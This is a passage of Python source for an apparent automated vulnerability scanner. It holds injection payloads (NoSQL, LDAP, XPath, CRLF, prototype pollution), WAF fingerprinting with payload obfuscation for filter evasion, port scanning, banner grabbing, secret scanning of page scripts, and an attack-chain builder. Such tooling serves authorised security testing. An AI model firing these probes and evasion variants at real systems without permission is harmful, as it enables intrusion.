    "CWE-943": {
        "label": "NoSQL Injection",
        "detect": "pattern",
        "payloads": ['{"$ne": ""}', '{"$gt": ""}', "' || '1'=='1"],
        "signatures": {
            "mongo": r"MongoError|MongoServerError",
            "operator": r"\$ne|\$gt|\$where",
        },
    },
    "CWE-90": {
        "label": "LDAP Injection",
        "detect": "pattern",
        "payloads": ["*)(uid=*))(|(uid=*", "admin)(&(password=*))"],
        "signatures": {"ldap": r"LDAPException|ldap_search|Invalid DN syntax"},
    },
    "CWE-643": {
        "label": "XPath Injection",
        "detect": "pattern",
        "payloads": ["' or '1'='1", "x' or name()='username' or 'x'='y"],
        "signatures": {"xpath": r"XPathException|XPath syntax error"},
    },
    "CWE-113": {
        "label": "CRLF Injection",
        "detect": "pattern",
        "payloads": ["%0d%0aX-Injected:%20true", "\r\nX-Injected: true"],
        "signatures": {"crlf": r"(?m)^X-Injected:\s*"},
    },
    "CWE-1321": {
        "label": "Prototype Pollution",
        "detect": "pattern",
        "payloads": ['{"__proto__": {"polluted": "yes"}}'],
        "signatures": {"polluted": r"polluted"},
    },
}

WAF_FP = {
    "cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "server:cloudflare"],
        "body": ["attention required! | cloudflare", "ray id:"],
        "status": [403, 503],
    },
    "akamai": {
        "headers": ["server:akamaighost"],
        "body": ["access denied | akamai"],
        "status": [403],
    },
    "imperva": {
        "headers": ["x-iinfo"],
        "body": ["incapsula incident id"],
        "status": [403],
    },
    "f5_big_ip_asm": {
        "headers": ["x-wa-info"],
        "body": ["the requested url was rejected"],
        "status": [403],
    },
    "aws_waf": {
        "headers": ["x-amzn-requestid"],
        "body": ["request blocked by aws waf"],
        "status": [403],
    },
    "fortiweb": {
        "headers": ["server:fortiweb"],
        "body": ["fortiweb"],
        "status": [403],
    },
    "sucuri": {
        "headers": ["x-sucuri-id"],
        "body": ["sucuri website firewall"],
        "status": [403],
    },
    "modsecurity": {
        "headers": ["server:modsecurity"],
        "body": ["mod_security"],
        "status": [403, 406],
    },
}


def sig_match(text, sigs, baseline=None):
    hits = []
    items = sigs.items() if isinstance(sigs, dict) else sigs
    for label, pat in items:
        try:
            if re.search(pat, text or "", re.I) and not (
                baseline and re.search(pat, baseline or "", re.I)
            ):
                hits.append(label)
        except re.error:
            pass
    return hits


def resp_blob(r):
    if r is None:
        return ""
    hdrs = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
    return hdrs + "\n\n" + (r.text or "")


def detect_waf(status, headers, body):
    lower_headers = {}
    for name, value in headers.items():
        lower_headers[str(name).lower()] = str(value).lower()
    lower_body = (body or "").lower()

    for vendor, fingerprint in WAF_FP.items():
        block_statuses = fingerprint.get("status", [])
        if status not in block_statuses:
            continue

        evidence = []
        for spec in fingerprint.get("headers", []):
            if ":" in spec:
                key, expected = spec.split(":", 1)
                key = key.strip()
                expected = expected.strip()
                actual = lower_headers.get(key)
                if actual is not None and expected in actual:
                    evidence.append(f"header:{spec}")
            elif spec in lower_headers:
                evidence.append(f"header:{spec}")

        for marker in fingerprint.get("body", []):
            if marker in lower_body:
                evidence.append(f"body:{marker}")

        if not evidence:
            continue

        evidence.append(f"status:{status}")
        return {"vendor": vendor, "evidence": evidence}

    return None


def obfuscate(p):
    vs = [p]
    for kw in ("SELECT", "UNION", "SLEEP", "AND", "OR", "WHERE"):
        if kw in p.upper():
            vs.append(p.replace(kw, kw.lower()))
    vs += [p.replace(" ", "/**/"), p.replace(" ", "%20"), quote(quote(p, safe=""))]
    return list(dict.fromkeys(vs))


def is_blocked(r):
    if r is None:
        return False
    if r.status_code in (403, 406, 429, 503):
        return True
    b = (r.text or "").lower()
    return any(
        p in b
        for p in (
            "blocked by",
            "access denied",
            "request rejected",
            "captcha",
            "challenge",
        )
    )


COMMON_PORTS = {
    22: "SSH", 23: "Telnet", 3389: "RDP", 21: "FTP", 445: "SMB",
    25: "SMTP", 110: "POP3", 143: "IMAP", 587: "SMTP-Sub", 993: "IMAPS",
    389: "LDAP", 636: "LDAPS", 53: "DNS", 80: "HTTP", 443: "HTTPS",
    8000: "HTTP-Alt", 8008: "HTTP-Alt", 8080: "HTTP-Proxy",
    8081: "HTTP-Alt", 8443: "HTTPS-Alt", 8888: "HTTP-Alt",
    9000: "HTTP-Alt", 9090: "HTTP-Alt", 1433: "MSSQL", 1521: "Oracle",
    3306: "MySQL", 5432: "PostgreSQL", 5984: "CouchDB", 6379: "Redis",
    27017: "MongoDB", 9200: "Elasticsearch", 2375: "Docker", 6443: "K8s-API",
}
SSL_PORTS = {443, 636, 993, 995, 8443, 2376}


def normalize_target(v):
    v = v.strip().rstrip("/")
    if not v:
        return []
    if v.startswith(("http://", "https://")):
        return [v]
    if v.startswith("["):
        e = v.find("]")
        if e == -1:
            return [f"https://{v}", f"http://{v}"]
        host, rest = v[: e + 1], v[e + 1 :]
        return [f"https://{host}{rest}", f"http://{host}{rest}"]
    if v.count(":") > 1:
        return [f"https://[{v}]", f"http://[{v}]"]
    if ":" in v:
        h, _, p = v.partition(":")
        return [f"https://{h}:{p}", f"http://{h}:{p}"]
    return [f"https://{v}", f"http://{v}"]


def extract_host(t):
    if "://" in t:
        return urllib.parse.urlparse(t).hostname or t
    if t.startswith("["):
        e = t.find("]")
        return t[1:e] if e != -1 else t[1:]
    if t.count(":") > 1:
        return t
    return t.split(":")[0] if t.count(":") == 1 else t


def _family(host):
    try:
        socket.inet_pton(socket.AF_INET6, host)
        return socket.AF_INET6
    except OSError:
        pass
    try:
        socket.inet_pton(socket.AF_INET, host)
        return socket.AF_INET
    except OSError:
        pass
    try:
        addrs = socket.getaddrinfo(host, None, socket.AF_UNSPEC, socket.SOCK_STREAM)
        if addrs:
            return addrs[0][0]
    except (socket.gaierror, OSError):
        pass
    return socket.AF_INET


def port_scan(host, ports, timeout=0.5, workers=50):
    fam = _family(host)

    def check(p):
        try:
            s = socket.socket(fam, socket.SOCK_STREAM)
            s.settimeout(timeout)
            ok = s.connect_ex((host, p)) == 0
            s.close()
            return p, ok
        except Exception:
            return p, False

    out = {}
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = [ex.submit(check, p) for p in ports]
        for f in as_completed(futs):
            p, ok = f.result()
            if ok:
                out[p] = ports[p]
    return out


def banner_grab(host, port, timeout=3.0, use_ssl=False):
    fam = _family(host)
    try:
        s = socket.socket(fam, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        b = b""
        if port in (21, 22, 25, 110, 143, 587, 993, 995, 3306):
            try:
                b = s.recv(1024)
            except socket.timeout:
                pass
        elif port == 6379:
            s.sendall(b"PING\r\n")
            try:
                b = s.recv(1024)
            except socket.timeout:
                pass
        elif port in (389, 636):
            s.sendall(b"\x30\x0c\x02\x01\x01\x60\x07\x02\x01\x03\x04\x00\x80\x00")
            try:
                b = s.recv(1024)
            except socket.timeout:
                pass
        elif port in (
            80, 443, 8000, 8008, 8080, 8081, 8443, 8888, 9000, 9090,
            9200, 2375, 2376, 6443,
        ):
            path = "/version" if port in (2375, 2376) else "/"
            s.sendall(
                f"GET {path} HTTP/1.0\r\nHost: {host}\r\nUser-Agent: cve-scanner/14.0\r\n\r\n".encode()
            )
            chunks = []
            while True:
                try:
                    c = s.recv(4096)
                    if not c:
                        break
                    chunks.append(c)
                    if sum(len(x) for x in chunks) > 65536:
                        break
                except socket.timeout:
                    break
            b = b"".join(chunks)
        s.close()
        return b.decode("utf-8", "replace")[:8192] if b else None
    except Exception:
        return None


def auto_banner(host, port, timeout=3.0):
    use_ssl = port in SSL_PORTS
    return banner_grab(host, port, timeout, use_ssl) or banner_grab(
        host, port, timeout, not use_ssl
    )


def detect_working_url(cands, sess, timeout=10):
    for url in cands:
        r = sess.get(url, timeout=timeout, allow_redirects=True)
        if r is not None:
            return (url, r.status_code)
    return None


TECH_SIGS = {
    "Apache HTTP Server": {
        "vendor": "apache", "product": "http_server",
        "header": (r"Server:\s*Apache/([\d.]+)", 1),
    },
    "nginx": {
        "vendor": "nginx", "product": "nginx",
        "header": (r"Server:\s*nginx/([\d.]+)", 1),
    },
    "Microsoft IIS": {
        "vendor": "microsoft", "product": "internet_information_services",
        "header": (r"Server:\s*Microsoft-IIS/([\d.]+)", 1),
    },
    "PHP": {
        "vendor": "php", "product": "php",
        "header": (r"X-Powered-By:\s*PHP/([\d.]+)", 1),
    },
    "ASP.NET": {
        "vendor": "microsoft", "product": "asp.net",
        "header": (r"X-AspNet-Version:\s*([\d.]+)", 1),
    },
    "jQuery": {
        "vendor": "jquery", "product": "jquery",
        "html": [r"jquery[.-]([\d.]+)(?:\.min)?\.js"],
    },
    "Bootstrap": {
        "vendor": "getbootstrap", "product": "bootstrap",
        "html": [r"bootstrap[/.\-]([\d.]+)(?:[/.\-]|\.min)?(?:js|css)"],
    },
    "WordPress": {
        "vendor": "wordpress", "product": "wordpress",
        "html": [r'<meta name="generator" content="WordPress ([\d.]+)'],
    },
    "Drupal": {
        "vendor": "drupal", "product": "drupal",
        "html": [r'<meta name="Generator" content="Drupal ([\d.]+)'],
    },
    "Joomla": {
        "vendor": "joomla", "product": "joomla",
        "html": [r'<meta name="generator" content="Joomla! ([\d.]+)'],
    },
    "Tomcat": {
        "vendor": "apache", "product": "tomcat",
        "html": [r"Apache Tomcat/([\d.]+)"],
    },
    "Jenkins": {
        "vendor": "jenkins", "product": "jenkins",
        "header": (r"X-Jenkins:\s*([\d.]+)", 1),
    },
    "GitLab": {
        "vendor": "gitlab", "product": "gitlab",
        "header": (r"X-Gitlab-Version:\s*([\d.]+)", 1),
    },
    "Grafana": {
        "vendor": "grafana", "product": "grafana",
        "header": (r"X-Grafana-Version:\s*([\d.]+)", 1),
    },
    "OpenSSL": {
        "vendor": "openssl", "product": "openssl",
        "header": (r"OpenSSL/([\d.]+[a-z]?)", 1),
    },
}
BANNER_SIGS = {
    "OpenSSH": {
        "vendor": "openbsd", "product": "openssh",
        "patterns": [r"SSH-[\d.]+-OpenSSH_([\d.]+)"],
    },
    "vsFTPd": {
        "vendor": "vsftpd_project", "product": "vsftpd",
        "patterns": [r"vsFTPd\s+([\d.]+)"],
    },
    "ProFTPD": {
        "vendor": "proftpd", "product": "proftpd",
        "patterns": [r"ProFTPD\s+([\d.]+)"],
    },
    "Exim": {"vendor": "exim", "product": "exim", "patterns": [r"Exim\s+([\d.]+)"]},
    "Postfix": {
        "vendor": "postfix", "product": "postfix",
        "patterns": [r"Postfix\s+([\d.]+)"],
    },
    "MySQL": {
        "vendor": "oracle", "product": "mysql",
        "patterns": [r"([\d]+\.[\d]+\.[\d]+)-[\w.-]*MySQL"],
    },
    "MariaDB": {
        "vendor": "mariadb", "product": "mariadb",
        "patterns": [r"5\.[\d.]+-MariaDB"],
    },
    "PostgreSQL": {
        "vendor": "postgresql", "product": "postgresql",
        "patterns": [r"PostgreSQL\s+([\d.]+)"],
    },
    "Redis": {
        "vendor": "redis", "product": "redis",
        "patterns": [r"redis_version:([\d.]+)"],
    },
    "MongoDB": {
        "vendor": "mongodb", "product": "mongodb",
        "patterns": [r'"version"\s*:\s*"([\d.]+)"'],
    },
}


def fingerprint_http(url, sess):
    r = sess.get(url, timeout=20, allow_redirects=True)
    if r is None:
        return []
    htxt = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
    body = r.text or ""
    detected = []
    for name, sig in TECH_SIGS.items():
        ver = None
        if "header" in sig:
            pat, grp = sig["header"]
            m = re.search(pat, htxt, re.I)
            if m and m.lastindex:
                ver = m.group(grp)
        if not ver:
            for pat in sig.get("html", []):
                m = re.search(pat, body, re.I)
                if m and m.lastindex:
                    ver = m.group(1)
                    break
        if ver:
            detected.append(
                {
                    "name": name, "version": ver,
                    "vendor": sig["vendor"], "product": sig["product"],
                    "source": "HTTP",
                }
            )
    return detected


def fingerprint_banner(banner):
    if not banner:
        return []
    detected = []
    for name, sig in BANNER_SIGS.items():
        for pat in sig["patterns"]:
            m = re.search(pat, banner, re.I)
            if m and m.lastindex:
                detected.append(
                    {
                        "name": name, "version": m.group(1),
                        "vendor": sig["vendor"], "product": sig["product"],
                        "source": "Banner",
                    }
                )
                break
    return detected


# ─── OSV LOOKUP ───────────────────────────────────────────────────────
OSV_API = "https://api.osv.dev/v1/query"
OSV_TIMEOUT = 15

OSV_ECOSYSTEM_MAP = {
    "jquery": [("npm", "jquery")],
    "bootstrap": [("npm", "bootstrap")],
    "react": [("npm", "react")],
    "angular": [("npm", "@angular/core")],
    "vue": [("npm", "vue")],
    "lodash": [("npm", "lodash")],
    "moment": [("npm", "moment")],
    "wordpress": [("Packagist", "wordpress/wordpress")],
    "drupal": [("Packagist", "drupal/drupal")],
    "joomla": [("Packagist", "joomla/joomla-cms")],
    "laravel": [("Packagist", "laravel/framework")],
    "symfony": [("Packagist", "symfony/symfony")],
    "phpunit": [("Packagist", "phpunit/phpunit")],
    "tomcat": [("Maven", "org.apache.tomcat:tomcat")],
    "struts": [("Maven", "org.apache.struts:struts2-core")],
    "spring": [("Maven", "org.springframework:spring-core")],
    "log4j": [("Maven", "org.apache.logging.log4j:log4j-core")],
    "log4j2": [("Maven", "org.apache.logging.log4j:log4j-core")],
    "jenkins": [("Maven", "org.jenkins-ci.main:jenkins-core")],
    "shiro": [("Maven", "org.apache.shiro:shiro-core")],
}


def _osv_query(package, version, ecosystem):
    payload = json.dumps(
        {"package": {"name": package, "ecosystem": ecosystem}, "version": version}
    ).encode()
    req = urllib.request.Request(
        OSV_API,
        data=payload,
        headers={"Content-Type": "application/json", "User-Agent": "cve-scanner/14.0"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(
            req, timeout=OSV_TIMEOUT, context=ssl.create_default_context()
        ) as r:
            return json.loads(r.read().decode())
    except Exception:
        return {}


def osv_lookup(product, version):
    if not product or not version:
        return []
    pairs = OSV_ECOSYSTEM_MAP.get(product.lower())
    if not pairs:
        return []
    cves = []
    seen = set()
    for eco, pkg_name in pairs:
        data = _osv_query(pkg_name, version, eco)
        for v in data.get("vulns", []):
            for alias in v.get("aliases", []):
                if alias.startswith("CVE-") and alias not in seen:
                    seen.add(alias)
                    cves.append(alias)
            vid = v.get("id", "")
            if vid.startswith("CVE-") and vid not in seen:
                seen.add(vid)
                cves.append(vid)
    return cves


# ─── SECRETS SCANNER ──────────────────────────────────────────────────
SECRET_RULES = [
    ("aws-access-key", "cloud", r"\bAKIA[0-9A-Z]{16}\b", 3.0),
    ("aws-secret", "cloud", r"(?i)aws[_\- ]?secret[_\- ]?access[_\- ]?key\s*[:=]\s*[\"']?([0-9A-Za-z/+]{40})", 3.5),
    ("github-pat", "vcs", r"\bghp_[0-9A-Za-z]{36}\b", 3.0),
    ("github-oauth", "vcs", r"\bgho_[0-9A-Za-z]{36}\b", 3.0),
    ("github-app", "vcs", r"\b(?:ghu|ghs)_[0-9A-Za-z]{36}\b", 3.0),
    ("gitlab-pat", "vcs", r"\bglpat-[0-9A-Za-z_\-]{20}\b", 3.0),
    ("slack-token", "chat", r"\bxox[baprs]-[0-9A-Za-z\-]{10,48}\b", 2.5),
    ("google-api-key", "cloud", r"\bAIza[0-9A-Za-z_\-]{35}\b", 3.0),
    ("stripe-key", "payment", r"\b(?:sk|rk)_(?:live|test)_[0-9A-Za-z]{24,}\b", 3.0),
    ("sendgrid-key", "email", r"\bSG\.[0-9A-Za-z_\-]{22}\.[0-9A-Za-z_\-]{43}\b", 3.5),
    ("twilio-key", "sms", r"\bSK[0-9a-fA-F]{32}\b", 3.0),
    ("jwt", "auth", r"\beyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\b", 3.0),
    ("private-key", "key", r"-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----", 0.0),
    ("generic-secret", "generic", r"(?i)(?:api[_-]?key|apikey|secret|token|password)\s*[:=]\s*[\"']([0-9A-Za-z_\-]{16,64})[\"']", 3.5),
]

_SECRET_FP = (
    "example", "sample", "dummy", "changeme", "placeholder",
    "your_", "xxxx", "test_", "fake", "redacted",
)

JS_SRC_RE = re.compile(r"<script[^>]+src=[\"']([^\"']+)[\"']", re.I)


def _shannon_entropy(s):
    if not s:
        return 0.0
    freq = {}
    for ch in s:
        freq[ch] = freq.get(ch, 0) + 1
    n = len(s)
    ent = 0.0
    for c in freq.values():
        p = c / n
        ent -= p * math.log2(p)
    return ent


def _redact(s):
    if len(s) <= 8:
        return "*" * len(s)
    return s[:4] + "..." + s[-2:]


def scan_secrets(text, source, limit=25):
    out = []
    if not text:
        return out
    for rule_id, category, pattern, min_entropy in SECRET_RULES:
        for m in re.finditer(pattern, text):
            value = m.group(1) if m.lastindex else m.group(0)
            low = value.lower()
            if any(fp in low for fp in _SECRET_FP):
                continue
            if len(set(value)) <= 3:
                continue
            if min_entropy > 0 and _shannon_entropy(value) < min_entropy:
                continue
            out.append(
                {
                    "source": source,
                    "rule": rule_id,
                    "category": category,
                    "entropy": round(_shannon_entropy(value), 2),
                    "match": _redact(value),
                    "offset": m.start(),
                }
            )
            if len(out) >= limit:
                return out
    return out


def _find_js_urls(html, base_url, limit):
    base = urllib.parse.urlparse(base_url)
    seen, out = set(), []
    for m in JS_SRC_RE.finditer(html or ""):
        u = urljoin(base_url, m.group(1))
        p = urllib.parse.urlparse(u)
        if p.netloc and p.netloc != base.netloc:
            continue
        if u in seen:
            continue
        seen.add(u)
        out.append(u)
        if len(out) >= limit:
            break
    return out


def _scan_target_secrets(target, url, page, sess):
    sources = []
    if page is not None:
        sources.append((url, page.text or ""))
    if SCAN_SECRETS_JS and page is not None:
        for js_url in _find_js_urls(page.text, url, MAX_JS_FILES):
            r = sess.get(js_url, timeout=PROBE_TIMEOUT, allow_redirects=True)
            if r is not None and r.text:
                sources.append((js_url, r.text[:524288]))
    found = []
    for src_url, body in sources:
        for hit in scan_secrets(body, src_url):
            hit["target"] = target
            found.append(hit)
    return found


# ─── ATTACK CHAIN BUILDER ─────────────────────────────────────────────
ROLE_KEYWORDS = [
    ("path traversal", "file_access"),
    ("file read", "file_access"),
    ("auth bypass", "access_escalation"),
    ("broken access", "access_escalation"),
    ("rce", "code_exec"),
    ("command injection", "code_exec"),
    ("deserialization", "code_exec"),
    ("ssti", "code_exec"),
    ("shellshock", "code_exec"),
    ("backdoor", "code_exec"),
    ("sqli", "data_access"),
    ("sql injection", "data_access"),
    ("xxe", "data_access"),
    ("ssrf", "internal_access"),
    ("env leak", "credential_theft"),
    ("bleed", "credential_theft"),
]

CWE_ROLES = {
    "CWE-22": "file_access", "CWE-78": "code_exec", "CWE-79": "exposure",
    "CWE-89": "data_access", "CWE-90": "data_access", "CWE-94": "code_exec",
    "CWE-113": "exposure", "CWE-502": "code_exec", "CWE-601": "exposure",
    "CWE-611": "data_access", "CWE-643": "data_access", "CWE-918": "internal_access",
    "CWE-943": "data_access", "CWE-1321": "exposure",
}

ROLE_TRANSITIONS = {
    ("information_theft", "access_escalation"): "credential_reuse",
    ("information_theft", "internal_access"): "recon_to_ssrf",
    ("internal_access", "code_exec"): "SSRF to RCE",
    ("file_access", "code_exec"): "LFI to RCE",
    ("file_access", "information_theft"): "source_disclosure",
    ("data_access", "information_theft"): "data_exfiltration",
    ("data_access", "access_escalation"): "credential_extraction",
    ("access_escalation", "code_exec"): "privileged_execution",
    ("access_escalation", "data_access"): "admin_data_access",
    ("credential_theft", "access_escalation"): "credential_to_bypass",
    ("credential_theft", "internal_access"): "credential_to_pivot",
    ("exposure", "access_escalation"): "misconfig_to_bypass",
    ("exposure", "file_access"): "disclosure_to_traversal",
    ("code_exec", "data_access"): "rce_to_exfil",
}


def _finding_role(record):
    if record.get("test_type") == "secret":
        return "credential_theft"
    cwe = record.get("cwe_id")
    if cwe and cwe in CWE_ROLES:
        return CWE_ROLES[cwe]
    label = (record.get("label") or "").lower()
    for kw, role in ROLE_KEYWORDS:
        if kw in label:
            return role
    return None


def _finding_id(record):
    if record.get("test_type") == "secret":
        return "secret:" + record.get("rule", "?")
    return record.get("cve_id") or record.get("cwe_id") or record.get("endpoint", "?")


def _build_chains(records, max_links=3, max_chains=MAX_CHAINS):
    nodes, seen_ids = [], set()
    for r in records:
        if r.get("result") != "CONFIRMED":
            continue
        role = _finding_role(r)
        if not role:
            continue
        nid = _finding_id(r)
        if nid in seen_ids:
            continue
        seen_ids.add(nid)
        nodes.append({"id": nid, "role": role, "record": r})

    adj = {}
    for a in nodes:
        for b in nodes:
            if a["id"] == b["id"]:
                continue
            label = ROLE_TRANSITIONS.get((a["role"], b["role"]))
            if label:
                adj.setdefault(a["id"], []).append((b, label))

    out = []

    def walk(path, transitions):
        if len(path) >= max_links or len(out) >= max_chains:
            return
        for nxt, label in adj.get(path[-1]["id"], []):
            if any(p["id"] == nxt["id"] for p in path):
                continue
            new_path = path + [nxt]
            new_tr = transitions + [label]
            if len(new_path) >= 2:
                final_role = new_path[-1]["role"]
                combined = "CRITICAL" if final_role in ("code_exec", "access_escalation") else "HIGH"
                out.append(
                    {
                        "name": new_tr[-1],
                        "links": [
                            {
                                "finding": l["id"],
                                "role": l["role"],
                                "label": l["record"].get("label", ""),
                                "endpoint": l["record"].get("endpoint")
                                or l["record"].get("source", ""),
                            }
                            for l in new_path
                        ],
                        "transitions": new_tr,
                        "combined_severity": combined,
                        "description": " -> ".join(p["id"] for p in new_path),
                    }
                )
            walk(new_path, new_tr)

    for n in nodes:
        walk([n], [])
        if len(out) >= max_chains:
            break
    return out[:max_chains]


# ─── SIGNAL DETECTION ─────────────────────────────────────────────────
def _signal_xss(exploit, baseline, probe):
    for marker in probe.get("markers", []):
        if marker in exploit.text and marker not in baseline.text:
            return True, f"marker {marker!r} reflected"
    hits = sig_match(exploit.text, XSS_SIGS, baseline.text)
    if hits:
        return True, f"XSS sigs: {hits}"
    return False, "no reflection"


def _signal_sql_rce(exploit, baseline, probe, ex_txt, bl_txt):
    delta = exploit.elapsed_seconds - baseline.elapsed_seconds
    threshold = probe.get("timing_threshold", 3.0)
    if delta >= threshold:
        return True, f"timing delta {delta:.1f}s"
    mode = probe["detect"]
    sigs = SQL_SIGS if mode == "sql" else RCE_SIGS
    hits = sig_match(ex_txt, sigs, bl_txt)
    if hits:
        return True, f"{mode.upper()} sigs: {hits}"
    return False, "no signal"


def _signal_pattern(probe, ex_txt, bl_txt):
    hits = sig_match(ex_txt, probe.get("signatures", {}), bl_txt)
    if hits:
        return True, f"signatures: {hits}"
    return False, "no signal"


def _signal_ssti(exploit, baseline, probe, ex_txt, bl_txt):
    expected = probe.get("expected", "")
    if expected and expected in exploit.text and expected not in baseline.text:
        return True, f"SSTI evaluated -> {expected}"
    hits = sig_match(ex_txt, SSTI_SIGS, bl_txt)
    if hits:
        return True, f"SSTI sigs: {hits}"
    return False, "no signal"


def _signal_redirect(exploit, probe, ex_txt, bl_txt):
    location = exploit.header("Location")
    expected = probe.get("expected", "evil.example.com")
    if expected in location:
        return True, f"redirects to {location}"
    hits = sig_match(ex_txt, REDIR_SIGS, bl_txt)
    if hits:
        return True, f"redirect sigs: {hits}"
    return False, "no redirect"


def signal(exploit, baseline, payload, probe):
    if exploit is None or baseline is None:
        return False, "request failed"
    mode = probe["detect"]
    ex_txt = resp_blob(exploit)
    bl_txt = resp_blob(baseline)
    if mode == "xss_reflection":
        return _signal_xss(exploit, baseline, probe)
    if mode in ("sql", "rce"):
        return _signal_sql_rce(exploit, baseline, probe, ex_txt, bl_txt)
    if mode == "pattern":
        return _signal_pattern(probe, ex_txt, bl_txt)
    if mode == "ssti":
        return _signal_ssti(exploit, baseline, probe, ex_txt, bl_txt)
    if mode == "redirect":
        return _signal_redirect(exploit, probe, ex_txt, bl_txt)
    return False, f"unknown mode {mode}"


# ─── INJECTION POINTS ─────────────────────────────────────────────────
FORM_RE = re.compile(r"<form\b[^>]*>(.*?)</form>", re.I | re.S)
NAME_RE = re.compile(r"name=[\"']([^\"']+)", re.I)
ACT_RE = re.compile(r"action=[\"']?([^\"'\s>]+)", re.I)
METH_RE = re.compile(r"method=[\"']?([^\"'\s>]+)", re.I)


def injection_points(html, base_url):
    seen, pts = set(), []

    def add(u, m, ps):
        k = (u, m, tuple(sorted(ps)))
        if k not in seen:
            seen.add(k)
            pts.append({"url": u, "method": m, "params": ps})

    q = urllib.parse.urlparse(base_url).query
    if q:
        add(base_url, "GET",
            list(urllib.parse.parse_qs(q, keep_blank_values=True).keys()))
    for fm in FORM_RE.finditer(html):
        outer = fm.group(0)
        inner = fm.group(1)
        a = ACT_RE.search(outer)
        m = METH_RE.search(outer)
        action = urljoin(base_url, a.group(1)) if a else base_url
        method = (m.group(1) if m else "GET").upper()
        ps = [n.group(1) for n in NAME_RE.finditer(inner)]
        if ps:
            add(action, method, ps)
    return pts


# ─── RATE LIMITER ─────────────────────────────────────────────────────
class RateLimiter:
    def __init__(self, rate=0.0, jitter=0.0):
        self.rate = rate
        self.jitter = jitter
        self._last = time.monotonic()

    def wait(self):
        if self.rate <= 0:
            return
        gap = 1.0 / self.rate
        el = time.monotonic() - self._last
        if el < gap:
            time.sleep(gap - el)
        if self.jitter > 0:
            import random
            time.sleep(self.jitter * (0.5 + 0.5 * random.random()))
        self._last = time.monotonic()


# ─── PROBE HELPERS ────────────────────────────────────────────────────
def _resp_summary(r, body_limit):
    if r is None:
        return None
    text = r.text or ""
    return {
        "status_code": r.status_code,
        "elapsed_ms": round(r.elapsed_seconds * 1000, 1),
        "headers": dict(r.headers),
        "body_excerpt": text[:body_limit],
        "body_length": len(text),
    }


def _send_pt(sess, pt, values, limiter, allow_redirects=False):
    limiter.wait()
    if pt["method"] == "GET":
        return sess.request(
            "GET", pt["url"], params=values,
            allow_redirects=allow_redirects, timeout=PROBE_TIMEOUT,
        )
    return sess.request(
        pt["method"], pt["url"], data=values,
        allow_redirects=allow_redirects, timeout=PROBE_TIMEOUT,
    )


def _cve_attempt(target, url, cve_id, label, p, sess, limiter, baseline, bl_blob):
    probe_url = urljoin(url, p.get("path", "/"))
    method = p.get("method", "GET")
    req_headers = dict(p.get("headers") or {})
    req_body = p.get("data")
    if p.get("json_body") is not None:
        req_body = json.dumps(p["json_body"])
        req_headers.setdefault("Content-Type", "application/json")
    limiter.wait()
    ex = sess.request(
        method, probe_url,
        data=p.get("data"), headers=p.get("headers"),
        json_body=p.get("json_body"), timeout=PROBE_TIMEOUT,
    )
    result = "NOT_REPRODUCED"
    evidence = ""
    if ex is None:
        result = "ERROR"
        evidence = "request failed"
    elif (
        is_blocked(ex) and not is_blocked(baseline)
        and detect_waf(ex.status_code, ex.headers, ex.text)
    ):
        result = "WAF_BLOCKED"
        evidence = "blocked by WAF"
    else:
        require = p.get("require_status")
        if require and ex.status_code not in require:
            evidence = f"status {ex.status_code} not in {require}"
        else:
            hits = sig_match(resp_blob(ex), p.get("sig", {}), bl_blob)
            if hits:
                result = "CONFIRMED"
                evidence = f"matched signatures: {hits}"
    body_limit = (
        RESPONSE_EXCERPT_CONFIRMED
        if result in ("CONFIRMED", "WAF_BLOCKED")
        else RESPONSE_EXCERPT_OTHER
    )
    return {
        "target": target, "test_type": "cve", "cve_id": cve_id,
        "label": label, "poc": p.get("path", "/"), "method": method,
        "endpoint": probe_url, "request_headers": req_headers,
        "request_body": req_body, "result": result, "evidence": evidence,
        "response": _resp_summary(ex, body_limit),
        "baseline": _resp_summary(baseline, body_limit),
    }


def _cwe_attempt(target, cwe_id, probe, pt, variant, sess, limiter, baseline):
    payload = {p: variant for p in pt["params"]}
    limiter.wait()
    ex = _send_pt(sess, pt, payload, limiter)
    result = "NOT_REPRODUCED"
    evidence = ""
    if ex is None:
        result = "ERROR"
        evidence = "request failed"
    elif (
        is_blocked(ex) and not is_blocked(baseline)
        and detect_waf(ex.status_code, ex.headers, ex.text)
    ):
        result = "WAF_BLOCKED"
        evidence = "blocked by WAF"
    else:
        vuln, why = signal(ex, baseline, variant, probe)
        if vuln:
            result = "CONFIRMED"
            evidence = why
    body_limit = (
        RESPONSE_EXCERPT_CONFIRMED
        if result in ("CONFIRMED", "WAF_BLOCKED")
        else RESPONSE_EXCERPT_OTHER
    )
    return {
        "target": target, "test_type": "cwe", "cwe_id": cwe_id,
        "label": probe["label"], "poc": variant, "method": pt["method"],
        "endpoint": pt["url"], "request_headers": {}, "request_body": payload,
        "result": result, "evidence": evidence,
        "response": _resp_summary(ex, body_limit),
        "baseline": _resp_summary(baseline, body_limit),
    }


def _probe_cves(target, url, cves, sess, limiter):
    if not cves:
        return []
    baseline = sess.get(url, timeout=PROBE_TIMEOUT, allow_redirects=False)
    if baseline is None:
        warn("Cannot fetch baseline; skipping CVE probing")
        return []
    bl_blob = resp_blob(baseline)
    records = []
    for cve_id in cves:
        probe = CVE_PROBES.get(cve_id)
        if not probe:
            continue
        for p in probe["probes"]:
            rec = _cve_attempt(
                target, url, cve_id, probe["label"], p,
                sess, limiter, baseline, bl_blob,
            )
            records.append(rec)
            if rec["result"] == "CONFIRMED":
                confirmed(cve_id, probe["label"], rec["evidence"])
                break
    return records


def _probe_cwes(target, url, page, sess, limiter):
    if page is None:
        info("No baseline page; CWE probing skipped")
        return []
    points = injection_points(page.text, url)
    if not points:
        info("No injection points found; CWE probing skipped")
        return []
    step(f"CWE probing ({len(CWE_PROBES)} classes, {len(points)} point(s))")
    records = []
    baselines = {}
    for pt in points:
        key = (pt["url"], pt["method"], tuple(sorted(pt["params"])))
        baselines[key] = _send_pt(
            sess, pt, {p: "safe_test_123" for p in pt["params"]}, limiter
        )
    for cwe_id, probe in CWE_PROBES.items():
        confirmed_this = False
